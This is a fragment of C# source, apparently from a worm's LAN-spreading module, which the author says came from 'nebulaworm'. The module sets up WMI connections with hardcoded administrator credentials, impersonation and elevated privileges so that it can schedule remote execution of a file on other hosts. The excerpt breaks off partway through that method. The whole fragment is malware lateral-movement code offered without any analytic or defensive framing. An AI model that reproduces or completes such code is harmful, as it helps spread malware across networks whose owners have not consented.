...
namespace NebulaRun
{ //LANSpread module i got from nebulaworm 
    internal static class LAN
    {
        ...
        private static string adminPass = "yourpassword"; 
        ...
        private static async Task TryScheduleRemoteExecutionAsync(string ip, string remoteFilePath)
        {
            await Task.Run(() =>
            {
                try
                {
                    var options = new ConnectionOptions { Username = adminUser, Password = adminPass, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Authentication = System.Management.AuthenticationLevel.PacketPrivacy, Timeout = TimeSpan.FromSeconds(10) };
